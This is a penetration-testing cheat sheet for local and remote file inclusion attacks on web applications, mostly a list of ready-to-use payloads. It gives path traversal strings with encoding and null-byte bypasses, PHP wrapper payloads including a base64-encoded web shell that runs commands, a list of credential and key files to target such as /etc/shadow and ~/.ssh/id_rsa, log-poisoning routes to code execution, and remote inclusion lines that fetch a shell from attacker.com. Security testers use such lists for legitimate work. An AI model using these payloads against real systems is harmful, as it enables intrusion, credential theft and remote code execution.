# File Inclusion

## Local File Inclusion (LFI)

- [ ] Look for any parameter that loads files or templates (e.g., `page=`, `file=`, `template=`, `lang=`, `include=`)
- [ ] Try basic path traversal payloads

```
../../../etc/passwd
..\..\..\..\windows\win.ini
```

- [ ] Try null byte injection (older PHP versions < 5.3.4)

```
../../../etc/passwd%00
```

- [ ] Try double encoding

```
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

- [ ] Try UTF-8 encoding

```
..%c0%af..%c0%af..%c0%afetc/passwd
```

- [ ] Try path truncation (older PHP on Windows - max path 256 chars)

```
../../../etc/passwd............................................................................
```

### PHP Wrappers

```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://input  (POST data as file content - needs allow_url_include=On)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://id  (needs expect extension)
```

### Interesting Files to Target

**Linux**

```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/[0-9]*
/var/log/apache2/access.log
/var/log/nginx/access.log
~/.bash_history
~/.ssh/id_rsa
```

**Windows**

```
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
```

### LFI to RCE

- [ ] Log poisoning - inject PHP code into access logs, then include the log file
- [ ] `/proc/self/environ` - inject code via User-Agent header
- [ ] PHP session files - inject code into session data, then include `/tmp/sess_<SESSION_ID>`
- [ ] Upload a file (e.g., image with embedded PHP) and include it

## Remote File Inclusion (RFI)

> [!warning] Requires `allow_url_include=On` in PHP

- [ ] Try including a remote file from a server you control

```
?page=http://attacker.com/shell.txt
?page=http://attacker.com/shell.txt%00
```

- [ ] If `http://` is filtered, try other schemes

```
?page=ftp://attacker.com/shell.txt
```

## Bypasses

- [ ] Try double URL encoding
- [ ] Try path normalization tricks (`....//....//`)
- [ ] Try adding a null byte before the expected extension (`%00`)
- [ ] If extension is being appended, try truncation techniques
- [ ] Try URL encoding just the dots or slashes
- [ ] Check if the filter is case-sensitive

---

## References

- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks - File Inclusion](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)
